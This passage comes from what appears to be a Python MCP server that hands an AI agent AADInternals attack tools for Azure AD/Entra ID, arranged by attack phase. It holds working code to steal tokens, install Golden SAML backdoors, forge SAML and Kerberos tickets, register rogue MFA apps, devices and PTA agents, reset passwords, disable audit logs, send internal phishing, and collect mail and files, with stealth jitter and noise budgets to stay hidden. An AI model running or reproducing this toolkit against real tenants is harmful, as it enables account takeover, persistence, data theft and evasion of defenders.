        client_id: Client ID (use FOCI member for cross-app pivot)
        tenant: Tenant ID (optional)
        save_as: Alias for the new token
    """
    rt = raw_refresh_token
    if not rt and refresh_token_alias:
        stored = tokens.get(refresh_token_alias)
        if stored:
            rt = stored.refresh_token or stored.value
        else:
            return json.dumps({"error": f"Token '{refresh_token_alias}' not found."})

    if not rt:
        return json.dumps({"error": "Provide refresh_token_alias or raw_refresh_token"})

    result = await bridge.execute("Get-AADIntAccessTokenWithRefreshToken", {
        "RefreshToken": rt,
        "Resource": resource,
        "ClientId": client_id,
        "TenantId": tenant,
        "IncludeRefreshToken": True,
        "SaveToCache": True,
    })

    if result.success and result.data:
        alias = save_as or f"refreshed_{resource.split('/')[-1]}"
        token_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=alias,
            resource=resource,
            token_type="access",
            value=token_value,
            obtained_via="refresh_token",
            client_id=client_id,
            tenant_id=tenant,
        ))

    return _format_result(result, "cred_token_refresh")


@mcp.tool()
async def cred_otp_generate(secret_key: str) -> str:
    """
    Generate a TOTP code from a secret key (obtained via persist_mfa_app).
    Use this to complete MFA challenges with a rogue authenticator.

    Cmdlet: New-AADIntOTP

    Args:
        secret_key: TOTP secret key from persist_mfa_app
    """
    result = await bridge.execute("New-AADIntOTP", {"SecretKey": secret_key})
    return _format_result(result, "cred_otp_generate")


@mcp.tool()
async def cred_otp_new_secret() -> str:
    """
    Generate a new random TOTP secret. Use with Register-AADIntMFAApp
    to create a new rogue authenticator with a known secret.

    Cmdlet: New-AADIntOTPSecret
    """
    result = await bridge.execute("New-AADIntOTPSecret", {})
    return _format_result(result, "cred_otp_new_secret")


@mcp.tool()
async def cred_imds_token(
    resource: str = "https://management.azure.com",
    client_id: str = "",
    object_id: str = "",
) -> str:
    """
    Steal a token from Azure VM Instance Metadata Service (IMDS).
    Only works when running ON an Azure VM. No credentials needed —
    any code on the VM can call IMDS at 169.254.169.254.
    OPSEC: LOW — no external logs, VM-local only.

    Cmdlet: Get-AADIntAccessTokenUsingIMDS

    Args:
        resource: Target resource URL
        client_id: Managed identity client ID (optional, for specific identity)
        object_id: Managed identity object ID (optional)
    """
    params: dict = {"Resource": resource}
    if client_id:
        params["ClientId"] = client_id
    if object_id:
        params["ObjectId"] = object_id

    result = await bridge.execute("Get-AADIntAccessTokenUsingIMDS", params)

    if result.success and result.data:
        alias = f"imds_{resource.split('/')[-1]}"
        token_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=alias,
            resource=resource,
            token_type="access",
            value=token_value,
            obtained_via="imds",
        ))

    return _format_result(result, "cred_imds_token")


@mcp.tool()
async def access_guest_invite(token_alias: str, email: str, redirect_url: str = "", message: str = "") -> str:
    """
    Invite an external user as guest to the tenant.
    OPSEC: Medium — invitation logged in audit logs.

    Cmdlet: New-AADIntGuestInvitation

    Args:
        token_alias: Token with guest invite permissions
        email: Email address to invite
        redirect_url: Where the guest lands after accepting (optional)
        message: Custom invitation message (optional)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    params: dict = {"AccessToken": token_val, "EmailAddress": email}
    if redirect_url:
        params["RedirectUrl"] = redirect_url
    if message:
        params["Message"] = message

    result = await bridge.execute("New-AADIntGuestInvitation", params)
    return _format_result(result, "access_guest_invite")


# ---------------------------------------------------------------
# PHASE 5: PERSISTENCE — FEDERATION and BACKDOORS (T1484, T1606)
# ---------------------------------------------------------------

@mcp.tool()
async def persist_federation(token_alias: str, domain: str, action: str = "detect") -> str:
    """
    Install or detect federation backdoor (Golden SAML attack).
    'install' converts a federated domain to a backdoor.
    'detect' scans for existing backdoors.
    'list_users' lists users with ImmutableIDs (needed for SAML forging).
    OPSEC: LOUD — federation changes are HIGH-FIDELITY alerts.

    Cmdlets: ConvertTo-AADIntBackdoor, Find-AADIntBackdoor

    Args:
        token_alias: Admin-level token alias
        domain: Target federated domain
        action: 'detect' (find existing), 'install' (set backdoor), 'list_users' (ImmutableIDs)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if action == "detect":
        result = await bridge.execute("Find-AADIntBackdoor", {"AccessToken": token_val})
    elif action == "install":
        result = await bridge.execute("ConvertTo-AADIntBackdoor", {"AccessToken": token_val, "DomainName": domain})
    elif action == "list_users":
        safe_token = token_val.replace("'", "''")
        script = f"""
$token = '{safe_token}'
$users = Get-AADIntUsers -AccessToken $token | Select-Object UserPrincipalName, ImmutableId, ObjectId | Where-Object {{ $_.ImmutableId }}
$users | ConvertTo-Json -Depth 5 -Compress
"""
        result = await bridge.execute_script(script)
    else:
        return json.dumps({"error": f"Unknown action: {action}. Use 'detect', 'install', or 'list_users'."})

    # Auto-save: persistence + cert + playbook + noise
    if result.success and action == "install":
        try:
            add_persistence(token_alias, "federation_backdoor", domain,
                           "persist_federation", "Golden SAML — forge tokens for any user",
                           "Revert federation settings on domain")
            save_cert_reference(token_alias, "federation", domain,
                               {"action": action, "domain": domain})
            log_playbook_entry(token_alias, "persist_federation", "S27", domain,
                               f"Federation backdoor {action}ed", "LOUD", "LOUD")
            log_noise(token_alias, "persist_federation", "loud", "loud",
                      "Federation setting change — HIGH FIDELITY alert")
        except Exception as e:
            logger.warning(f"Auto-save failed for persist_federation: {e}")

    return _format_result(result, "persist_federation")


@mcp.tool()
async def persist_saml_forge(
    immutable_id: str,
    issuer_uri: str,
    cert_path: str = "",
    saml_version: str = "1",
) -> str:
    """
    Forge a SAML token for any user (Golden SAML).
    Requires the backdoor signing certificate and target user's ImmutableID.

    Cmdlets: New-AADIntSAMLToken, New-AADIntSAML2Token

    Args:
        immutable_id: Target user's ImmutableID
        issuer_uri: Issuer URI of the backdoor federation
        cert_path: Path to the backdoor signing certificate (.pfx)
        saml_version: '1' for SAML 1.1, '2' for SAML 2.0
    """
    cmdlet = "New-AADIntSAML2Token" if saml_version == "2" else "New-AADIntSAMLToken"
    params: dict = {"ImmutableID": immutable_id, "Issuer": issuer_uri}
    if cert_path:
        params["PfxFileName"] = cert_path

    result = await bridge.execute(cmdlet, params)

    if result.success and result.data:
        tokens.add(Token(
            alias="saml_forged",
            resource="saml",
            token_type="saml",
            value=result.data if isinstance(result.data, str) else json.dumps(result.data),
            obtained_via="golden_saml",
        ))

    # Auto-save: cert reference + persistence + playbook
    if result.success:
        try:
            save_cert_reference("saml_forge", "federation", immutable_id, {"issuer_uri": issuer_uri})
            log_playbook_entry("saml_forge", "persist_saml_forge", "S28", immutable_id,
                               "SAML token forged", "Low", "Low")
        except Exception as e:
            logger.warning(f"Auto-save failed for persist_saml_forge: {e}")

    return _format_result(result, "persist_saml_forge")


@mcp.tool()
async def persist_device(token_alias: str, device_name: str = "", os_version: str = "", join_type: str = "aad") -> str:
    """
    Register a rogue device to Azure AD (AAD Join or Intune enrollment).
    Gets device certificate + PRT for bypassing device-based CA policies.
    OPSEC: Medium — device registration logged.

    Cmdlets: Join-AADIntDeviceToAzureAD, Join-AADIntDeviceToIntune

    Args:
        token_alias: Token with device join permissions
        device_name: Device display name (use realistic name for stealth)
        os_version: OS version string (e.g., '10.0.19045.2006')
        join_type: 'aad' (Azure AD Join) or 'intune' (Intune enrollment)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    params: dict = {"AccessToken": token_val}
    if device_name:
        params["DeviceName"] = device_name
    if os_version:
        params["OSVersion"] = os_version

    cmdlet = "Join-AADIntDeviceToIntune" if join_type == "intune" else "Join-AADIntDeviceToAzureAD"
    result = await bridge.execute(cmdlet, params)

    # Auto-save: persistence + cert + playbook + noise
    if result.success:
        eng = token_alias
        try:
            add_persistence(eng, f"rogue_device_{join_type}", device_name or "unknown",
                           "persist_device", f"Device cert ({join_type})",
                           f"Delete device in {'Intune' if join_type == 'intune' else 'Entra ID'}")
            save_cert_reference(eng, "devices", device_name or "unknown",
                               {"join_type": join_type, "os_version": os_version})
            log_playbook_entry(eng, "persist_device", "S29/S30", device_name or "unknown",
                               f"Rogue device registered ({join_type})", "Medium", "Medium")
            log_noise(eng, "persist_device", "medium", "medium", "Device registration logged in audit")
        except Exception as e:
            logger.warning(f"Auto-save failed for persist_device: {e}")

    return _format_result(result, "persist_device")


@mcp.tool()
async def persist_pta_agent(token_alias: str) -> str:
    """
    Register a rogue Pass-Through Authentication agent.
    Once registered, ALL password validations flow through this agent.
    OPSEC: LOUD — PTA agent registration is a critical security event.

    Cmdlet: Register-AADIntPTAAgent

    Args:
        token_alias: Token with PTA permissions (Global Admin required)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Register-AADIntPTAAgent", {"AccessToken": token_val})

    if result.success:
        try:
            add_persistence(token_alias, "rogue_pta_agent", "tenant-wide",
                           "persist_pta_agent", "All password validations route through agent",
                           "Deregister PTA agent in Entra ID")
            save_cert_reference(token_alias, "pta", "pta_agent", {"scope": "tenant-wide"})
            log_playbook_entry(token_alias, "persist_pta_agent", "S31", "tenant-wide",
                               "Rogue PTA agent registered — total auth bypass", "LOUD", "LOUD")
            log_noise(token_alias, "persist_pta_agent", "loud", "loud",
                      "PTA agent registration is a critical security event")
        except Exception as e:
            logger.warning(f"Auto-save failed for persist_pta_agent: {e}")

    return _format_result(result, "persist_pta_agent")


@mcp.tool()
async def persist_mfa_app(token_alias: str, user: str = "") -> str:
    """
    Register AADInternals as an authenticator app for a user (MFA persistence).
    Generates TOTP codes without the victim's phone.
    OPSEC: Medium — MFA registration logged.

    Cmdlet: Register-AADIntMFAApp

    Args:
        token_alias: Token with appropriate permissions
        user: Target user UPN (optional — defaults to token owner)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    params: dict = {"AccessToken": token_val}
    if user:
        params["UserPrincipalName"] = user

    result = await bridge.execute("Register-AADIntMFAApp", params)

    if result.success:
        target = user or "token_owner"
        try:
            add_persistence(token_alias, "rogue_mfa_app", target,
                           "persist_mfa_app", "TOTP secret (see creds/)",
                           "Remove MFA app registration in Entra ID")
            save_credential(token_alias, "mfa_secrets", target,
                           {"type": "totp", "source": "persist_mfa_app"})
            log_playbook_entry(token_alias, "persist_mfa_app", "S32", target,
                               "Rogue MFA authenticator registered", "Medium", "Medium")
            log_noise(token_alias, "persist_mfa_app", "medium", "medium",
                      "MFA registration event in audit log")
        except Exception as e:
            logger.warning(f"Auto-save failed for persist_mfa_app: {e}")

    return _format_result(result, "persist_mfa_app")


# ---------------------------------------------------------------
# PHASE 6: PRIVILEGE ESCALATION (T1548, T1098)
# ---------------------------------------------------------------

@mcp.tool()
async def privesc_azure_admin(token_alias: str) -> str:
    """
    Elevate Global Admin to Azure User Access Administrator.
    Grants control over ALL Azure subscriptions in the tenant.
    OPSEC: HIGH — elevation is logged in Azure Activity logs.

    Cmdlet: Grant-AADIntAzureUserAccessAdminRole

    Args:
        token_alias: Global Admin token alias
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Grant-AADIntAzureUserAccessAdminRole", {"AccessToken": token_val})
    return _format_result(result, "privesc_azure_admin")


@mcp.tool()
async def privesc_password_reset(token_alias: str, target_user: str, new_password: str) -> str:
    """
    Reset any user's password via Azure AD Sync API — NO old password needed.
    Requires AAD Connect sync account credentials.
    OPSEC: HIGH — password reset logged as sync service action.

    Cmdlet: Set-AADIntUserPassword

    Args:
        token_alias: AAD Connect sync account token
        target_user: Target user UPN or SourceAnchor
        new_password: New password to set
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Set-AADIntUserPassword", {
        "AccessToken": token_val,
        "SourceAnchor": target_user,
        "Password": new_password,
    })
    return _format_result(result, "privesc_password_reset")


@mcp.tool()
async def privesc_role_assign(token_alias: str, target_user: str, role: str, scope: str = "") -> str:
    """
    Assign Azure RBAC role to a user/group on a subscription or resource group.
    OPSEC: HIGH — role assignment logged.

    Cmdlet: Set-AADIntAzureRoleAssignment

    Args:
        token_alias: Azure management token alias
        target_user: Target user ObjectID
        role: Role name (e.g., 'Owner', 'Contributor', 'Reader')
        scope: Azure scope (subscription ID or resource group path)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    params: dict = {"AccessToken": token_val, "ObjectId": target_user, "RoleDefinitionName": role}
    if scope:
        params["Scope"] = scope

    result = await bridge.execute("Set-AADIntAzureRoleAssignment", params)
    return _format_result(result, "privesc_role_assign")


# ---------------------------------------------------------------
# PHASE 7: DEFENSE EVASION (T1562, T1556)
# ---------------------------------------------------------------

@mcp.tool()
async def evade_audit_logs(token_alias: str, action: str = "status") -> str:
    """
    Manage Unified Audit Log settings — check status, enable, or disable.
    OPSEC: LOUD — the disable action itself is logged before logs stop.

    Cmdlets: Get-AADIntUnifiedAuditLogSettings, Set-AADIntUnifiedAuditLogSettings

    Args:
        token_alias: Admin token alias
        action: 'status' (check), 'disable' (turn off), 'enable' (turn on)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if action == "status":
        result = await bridge.execute("Get-AADIntUnifiedAuditLogSettings", {"AccessToken": token_val})
    elif action == "disable":
        result = await bridge.execute("Set-AADIntUnifiedAuditLogSettings", {"AccessToken": token_val, "Enabled": False})
    elif action == "enable":
        result = await bridge.execute("Set-AADIntUnifiedAuditLogSettings", {"AccessToken": token_val, "Enabled": True})
    else:
        return json.dumps({"error": f"Unknown action: {action}"})

    return _format_result(result, "evade_audit_logs")


@mcp.tool()
async def evade_policy_weaken(token_alias: str, target: str, action: str = "status") -> str:
    """
    Weaken security policies and features for evasion.
    OPSEC: HIGH — policy changes are audited.

    Cmdlets: Set-AADIntTenantGuestAccess, Set-AADIntPassThroughAuthenticationEnabled,
             Set-AADIntDesktopSSOEnabled, Set-AADIntSyncFeatures

    Args:
        token_alias: Admin token alias
        target: What to weaken — 'guest_access', 'pta', 'sso'
        action: 'status' (check current) or 'weaken' (make more permissive)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if target == "guest_access":
        if action == "status":
            result = await bridge.execute("Get-AADIntTenantGuestAccess", {"AccessToken": token_val})
        else:
            result = await bridge.execute("Set-AADIntTenantGuestAccess", {"AccessToken": token_val, "Level": "permissive"})
    elif target == "pta":
        if action == "status":
            result = await bridge.execute("Get-AADIntSyncFeatures", {"AccessToken": token_val})
        else:
            result = await bridge.execute("Set-AADIntPassThroughAuthenticationEnabled", {"AccessToken": token_val, "Enabled": False})
    elif target == "sso":
        if action == "status":
            result = await bridge.execute("Get-AADIntDesktopSSO", {"AccessToken": token_val})
        else:
            result = await bridge.execute("Set-AADIntDesktopSSOEnabled", {"AccessToken": token_val, "Enabled": False})
    else:
        return json.dumps({"error": f"Unknown target: {target}. Use: guest_access, pta, sso"})

    return _format_result(result, "evade_policy_weaken")


# ---------------------------------------------------------------
# PHASE 8: LATERAL MOVEMENT (T1021, T1534, T1199)
# ---------------------------------------------------------------

@mcp.tool()
async def move_vm_exec(token_alias: str, vm_name: str, resource_group: str, subscription: str, script_content: str) -> str:
    """
    Run a script on an Azure VM via management API (RCE).
    OPSEC: HIGH — RunCommand is logged in Azure Activity logs.

    Cmdlet: Invoke-AADIntAzureVMScript

    Args:
        token_alias: Azure management token alias
        vm_name: Target VM name
        resource_group: Resource group containing the VM
        subscription: Azure subscription ID
        script_content: PowerShell script to run on the VM
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Invoke-AADIntAzureVMScript", {
        "AccessToken": token_val,
        "VMName": vm_name,
        "ResourceGroup": resource_group,
        "SubscriptionId": subscription,
        "Script": script_content,
    }, timeout=LONG_TIMEOUT)
    return _format_result(result, "move_vm_exec")


@mcp.tool()
async def move_messaging(token_alias: str, target: str, message: str, subject: str = "", platform: str = "teams") -> str:
    """
    Send internal phishing messages via Teams or Outlook.
    OPSEC: Medium — messages logged but appear as normal communication.

    Cmdlets: Send-AADIntTeamsMessage, Send-AADIntOutlookMessage

    Args:
        token_alias: Token alias (teams or exo token)
        target: Recipient UPN or email
        message: Message body
        subject: Email subject (Outlook only)
        platform: 'teams' or 'outlook'
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if platform == "teams":
        result = await bridge.execute("Send-AADIntTeamsMessage", {
            "AccessToken": token_val, "Recipient": target, "Message": message,
        })
    elif platform == "outlook":
        params: dict = {"AccessToken": token_val, "Recipient": target, "Message": message}
        if subject:
            params["Subject"] = subject
        result = await bridge.execute("Send-AADIntOutlookMessage", params)
    else:
        return json.dumps({"error": f"Unknown platform: {platform}"})

    return _format_result(result, "move_messaging")


@mcp.tool()
async def move_partner_pivot(token_alias: str, action: str = "list", target_tenant: str = "") -> str:
    """
    Pivot through partner/GDAP relationships to access managed tenants.
    OPSEC: Medium — partner API access is logged.

    Cmdlets: Get-AADIntMSPartnerContracts, New-AADIntMSPartnerDelegatedAdminRequest

    Args:
        token_alias: MS Partner token alias
        action: 'list' (list managed tenants) or 'request' (request delegated admin)
        target_tenant: Tenant ID for delegated admin request
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if action == "list":
        result = await bridge.execute("Get-AADIntMSPartnerContracts", {"AccessToken": token_val})
    elif action == "request" and target_tenant:
        result = await bridge.execute("New-AADIntMSPartnerDelegatedAdminRequest", {
            "AccessToken": token_val, "TenantId": target_tenant,
        })
    else:
        return json.dumps({"error": "Use 'list' or 'request' with target_tenant"})

    return _format_result(result, "move_partner_pivot")


# ---------------------------------------------------------------
# PHASE 9: COLLECTION and EXFILTRATION (T1530, T1114)
# ---------------------------------------------------------------

@mcp.tool()
async def collect_onedrive(token_alias: str, action: str = "list", file_path: str = "") -> str:
    """
    Access OneDrive files — list, download, or upload.
    OPSEC: Medium — file access logged in SharePoint audit logs.

    Cmdlets: Get-AADIntOneDriveFiles, Send-AADIntOneDriveFile

    Args:
        token_alias: OneDrive token alias
        action: 'list' (list files), 'download' (download all), 'upload' (upload file)
        file_path: File path for upload action
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if action in ("list", "download"):
        result = await bridge.execute("Get-AADIntOneDriveFiles", {"AccessToken": token_val}, timeout=LONG_TIMEOUT)
    elif action == "upload" and file_path:
        result = await bridge.execute("Send-AADIntOneDriveFile", {"AccessToken": token_val, "FileName": file_path})
    else:
        return json.dumps({"error": "Use 'list', 'download', or 'upload' with file_path"})

    return _format_result(result, "collect_onedrive")


@mcp.tool()
async def collect_sharepoint(token_alias: str, site_url: str, action: str = "users", file_path: str = "") -> str:
    """
    Access SharePoint Online sites — list users/groups, download/upload files.
    OPSEC: Medium — file operations logged.

    Cmdlets: Get-AADIntSPOSiteUsers, Get-AADIntSPOSiteGroups, Export-AADIntSPOSiteFile

    Args:
        token_alias: SPO token alias
        site_url: SharePoint site URL
        action: 'users', 'groups', 'download', 'upload'
        file_path: File path for download/upload
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    cmdlet_map = {
        "users": ("Get-AADIntSPOSiteUsers", {"AccessToken": token_val, "Site": site_url}),
        "groups": ("Get-AADIntSPOSiteGroups", {"AccessToken": token_val, "Site": site_url}),
        "download": ("Export-AADIntSPOSiteFile", {"AccessToken": token_val, "Site": site_url, "File": file_path}),
        "upload": ("Add-AADIntSPOSiteFiles", {"AccessToken": token_val, "Site": site_url, "Folder": file_path}),
    }

    entry = cmdlet_map.get(action)
    if not entry:
        return json.dumps({"error": f"Unknown action: {action}"})

    result = await bridge.execute(entry[0], entry[1])
    return _format_result(result, "collect_sharepoint")


@mcp.tool()
async def collect_teams(token_alias: str, action: str = "messages") -> str:
    """
    Access Teams data — messages, teams list.
    OPSEC: Medium — Teams API access logged.

    Cmdlets: Get-AADIntTeamsMessages, Get-AADIntMyTeams

    Args:
        token_alias: Teams token alias
        action: 'messages' (recent messages) or 'teams' (list teams)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    cmdlet = "Get-AADIntTeamsMessages" if action == "messages" else "Get-AADIntMyTeams"
    result = await bridge.execute(cmdlet, {"AccessToken": token_val})
    return _format_result(result, "collect_teams")


@mcp.tool()
async def collect_email(token_alias: str) -> str:
    """
    Open Outlook Web Access as the token owner — full mailbox access.
    OPSEC: Medium — MailItemsAccessed logged on E5.

    Cmdlet: Open-AADIntOWA

    Args:
        token_alias: Exchange Online token alias
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Open-AADIntOWA", {"AccessToken": token_val})
    return _format_result(result, "collect_email")


# ---------------------------------------------------------------
# PHASE 10: IMPACT — USER and CONFIGURATION (T1136, T1531)
# ---------------------------------------------------------------

@mcp.tool()
async def impact_user_ops(token_alias: str, action: str, target_user: str = "", properties: dict | None = None) -> str:
    """
    User manipulation: create, delete, modify users, disable MFA.
    OPSEC: LOUD — all user operations are audited.

    Cmdlets: New-AADIntUser, Remove-AADIntUser, Set-AADIntUser, Set-AADIntUserMFA

    Args:
        token_alias: Admin token alias
        action: 'create', 'delete', 'modify', 'disable_mfa'
        target_user: UPN for delete/modify/disable_mfa
        properties: Dict of properties for create/modify (e.g., {"DisplayName": "...", "Password": "..."})
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if action == "create" and properties:
        params = {"AccessToken": token_val, **properties}
        result = await bridge.execute("New-AADIntUser", params)
    elif action == "delete" and target_user:
        result = await bridge.execute("Remove-AADIntUser", {"AccessToken": token_val, "UserPrincipalName": target_user})
    elif action == "modify" and target_user and properties:
        params = {"AccessToken": token_val, "UserPrincipalName": target_user, **properties}
        result = await bridge.execute("Set-AADIntUser", params)
    elif action == "disable_mfa" and target_user:
        result = await bridge.execute("Set-AADIntUserMFA", {"AccessToken": token_val, "UserPrincipalName": target_user, "State": "Disabled"})
    else:
        return json.dumps({"error": f"Invalid action '{action}' or missing required params"})

    return _format_result(result, "impact_user_ops")


@mcp.tool()
async def impact_config(token_alias: str, action: str, params_dict: dict | None = None) -> str:
    """
    Configuration tampering: compliance spoofing, domain manipulation.
    OPSEC: LOUD — configuration changes are audited.

    Cmdlets: Set-AADIntDeviceCompliant, New-AADIntMOERADomain, Set-AADIntDomainAuthentication

    Args:
        token_alias: Admin/MDM token alias
        action: 'spoof_compliance', 'add_domain', 'set_domain_auth'
        params_dict: Additional parameters for the action
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    extra = params_dict or {}
    cmdlet_map = {
        "spoof_compliance": "Set-AADIntDeviceCompliant",
        "add_domain": "New-AADIntMOERADomain",
        "set_domain_auth": "Set-AADIntDomainAuthentication",
    }
    cmdlet = cmdlet_map.get(action)
    if not cmdlet:
        return json.dumps({"error": f"Unknown action: {action}"})

    result = await bridge.execute(cmdlet, {"AccessToken": token_val, **extra})
    return _format_result(result, "impact_config")


# ---------------------------------------------------------------
# PHASE 11: AZURE RESOURCE ACCESS (T1580)
# ---------------------------------------------------------------

@mcp.tool()
async def azure_enum(token_alias: str, scope: str = "all") -> str:
    """
    Enumerate Azure resources: subscriptions, VMs, tenants, classic admins.
    OPSEC: Low-Medium — read operations.

    Cmdlets: Get-AADIntAzureSubscriptions, Get-AADIntAzureVMs, Get-AADIntAzureTenants

    Args:
        token_alias: Azure management token alias
        scope: 'all', 'subscriptions', 'vms', 'tenants', 'admins'
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    if scope == "all":
        safe_token = token_val.replace("'", "''")
        script = f"""
$token = '{safe_token}'
$results = @{{}}
try {{ $results.Tenants = Get-AADIntAzureTenants -AccessToken $token }} catch {{ $results.Tenants = $_.Exception.Message }}
try {{ $results.Subscriptions = Get-AADIntAzureSubscriptions -AccessToken $token }} catch {{ $results.Subscriptions = $_.Exception.Message }}
try {{ $results.VMs = Get-AADIntAzureVMs -AccessToken $token }} catch {{ $results.VMs = $_.Exception.Message }}
$results | ConvertTo-Json -Depth 5 -Compress
"""
        result = await bridge.execute_script(script, timeout=LONG_TIMEOUT)
    else:
        cmdlet_map = {
            "subscriptions": "Get-AADIntAzureSubscriptions",
            "vms": "Get-AADIntAzureVMs",
            "tenants": "Get-AADIntAzureTenants",
            "admins": "Get-AADIntAzureClassicAdministrators",
        }
        cmdlet = cmdlet_map.get(scope)
        if not cmdlet:
            return json.dumps({"error": f"Unknown scope: {scope}"})
        result = await bridge.execute(cmdlet, {"AccessToken": token_val})

    return _format_result(result, "azure_enum")


# ---------------------------------------------------------------
# PHASE 12: KERBEROS and SSO (T1550)
# ---------------------------------------------------------------

@mcp.tool()
async def kerberos_ticket(sid: str, upn: str, password_hash: str) -> str:
    """
    Create a Kerberos ticket for Azure AD Seamless SSO (Silver Ticket attack).
    Requires AZUREADSSOACC$ computer account hash from on-prem AD.

    Cmdlet: New-AADIntKerberosTicket

    Args:
        sid: User's on-prem SID
        upn: User's UPN
        password_hash: AZUREADSSOACC$ NT hash
    """
    result = await bridge.execute("New-AADIntKerberosTicket", {
        "Sid": sid, "UserPrincipalName": upn, "Hash": password_hash,
    })

    if result.success and result.data:
        tokens.add(Token(
            alias="kerberos_sso",
            resource="kerberos",
            token_type="kerberos",
            value=result.data if isinstance(result.data, str) else json.dumps(result.data),
            obtained_via="seamless_sso_silver_ticket",
            user_principal_name=upn,
        ))

    return _format_result(result, "kerberos_ticket")


# ---------------------------------------------------------------
# RAW CMDLET PASSTHROUGH — ESCAPE HATCH
# ---------------------------------------------------------------

@mcp.tool()
async def raw_invoke(cmdlet: str, parameters: dict | None = None, token_alias: str = "", timeout: int = 120) -> str:
    """
    Run any AADInternals cmdlet directly. Escape hatch for cmdlets not covered
    by the scenario tools. Cmdlet name must match AADInt naming pattern.

    Examples:
        raw_invoke(cmdlet="Get-AADIntCompanyInformation", token_alias="graph")
        raw_invoke(cmdlet="Get-AADIntDynamicAbusableGroups", token_alias="aad_graph")

    Args:
        cmdlet: Full AADInternals cmdlet name (e.g., 'Get-AADIntCompanyInformation')
        parameters: Dict of cmdlet parameters
        token_alias: Optional token alias — adds -AccessToken automatically
        timeout: Command timeout in seconds (default 120, max 600)
    """
    params = dict(parameters) if parameters else {}

    if token_alias:
        token_val = tokens.get_value(token_alias)
        if token_val:
            params["AccessToken"] = token_val
        else:
            return json.dumps({"error": f"Token '{token_alias}' not found."})

    timeout = min(timeout, 600)
    result = await bridge.execute(cmdlet, params, timeout=timeout)
    return _format_result(result, f"raw_invoke:{cmdlet}")


# ---------------------------------------------------------------
# PHASE 13: OPSEC GOVERNANCE
# ---------------------------------------------------------------

@mcp.tool()
async def opsec_budget_check(engagement: str, tool_name: str) -> str:
    """
    Check if a tool is allowed under the current noise budget.
    Returns: allowed, remaining budget, cost, reason.
    Call this before HIGH or LOUD tools.

    Args:
        engagement: Engagement name (e.g., 'm.grdz.org')
        tool_name: Tool to check (e.g., 'persist_federation')
    """
    result = check_budget(engagement, tool_name)
    return json.dumps(result, indent=2)


@mcp.tool()
async def opsec_budget_set(engagement: str, total: int = 100) -> str:
    """
    Set the noise budget for an engagement.
    Default: 100. Silent=0, Low=1, Medium=5, High=20, Loud=50.

    Args:
        engagement: Engagement name
        total: Total noise budget points
    """
    set_budget(engagement, total)
    return json.dumps({"status": "success", "engagement": engagement, "budget": total})


@mcp.tool()
async def opsec_budget_report(engagement: str) -> str:
    """
    Full noise budget report: spent, remaining, per-tool breakdown, projected actions.

    Args:
        engagement: Engagement name
    """
    report = get_budget_report(engagement)
    return json.dumps(report, indent=2)


# ---------------------------------------------------------------
# PHASE 14: EVASION
# ---------------------------------------------------------------

@mcp.tool()
async def evasion_set_ua(context: str = "random") -> str:
    """
    Get a realistic user-agent string for stealth.
    Contexts: outlook, teams, edge, azure_cli, powershell, mobile, random.

    Args:
        context: App context for UA selection
    """
    ua = get_user_agent(context)
    return json.dumps({"user_agent": ua, "context": context})


@mcp.tool()
async def evasion_jitter(profile: str = "normal") -> str:
    """
    Apply timing jitter between operations.
    Profiles: aggressive (2-5s), normal (10-30s), stealth (60-300s).

    Args:
        profile: Timing profile
    """
    import asyncio as _asyncio
    delay = apply_jitter(profile)
    await _asyncio.sleep(delay)
    return json.dumps({"profile": profile, "delay_seconds": round(delay, 1)})


@mcp.tool()
async def evasion_foci_list() -> str:
    """List all 36 FOCI family members with client IDs for token pivoting."""
    targets = get_foci_pivot_targets()
    return json.dumps({"foci_family": targets, "count": len(targets)}, indent=2)


@mcp.tool()
async def evasion_audience_switch(blocked_resource: str) -> str:
    """
    Suggest FOCI alternative resources when one is blocked by CA.

    Args:
        blocked_resource: Resource that was blocked (e.g., 'graph', 'exo')
    """
    alternatives = suggest_audience_switch(blocked_resource)
    return json.dumps({"blocked": blocked_resource, "alternatives": alternatives}, indent=2)


# ---------------------------------------------------------------
# PHASE 15: ANALYSIS
# ---------------------------------------------------------------

@mcp.tool()
async def analyze_ca(token_alias: str) -> str:
    """
    Dump and analyze Conditional Access policies for bypass opportunities.
